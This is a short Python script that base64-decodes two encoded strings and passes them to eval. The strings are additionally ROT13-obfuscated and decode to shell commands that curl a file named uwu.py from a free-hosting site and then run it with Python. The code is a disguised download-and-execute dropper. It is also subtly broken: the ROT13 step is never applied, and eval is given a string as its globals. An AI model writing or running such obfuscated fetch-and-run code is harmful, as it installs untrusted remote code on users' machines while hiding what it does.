import codecs
import base64
import os

first = '''
YmYuZmxmZ3J6KCJwaGV5IC1CIHVnZ2NmOi8vYW5odHVnLW9iYnhmLjAwMGpyb3ViZmduY2MucGJ6L2hqaC5jbCIpCg==
'''

second = '''
YmYuZmxmZ3J6KCJDbGd1YmEgaGpoLmNsIikK
'''

first_byte = base64.b64decode(first)
first_string = first_byte.decode()
second_byte = base64.b64decode(second)
second_string = second_byte.decode()

eval(first_string, second_string)
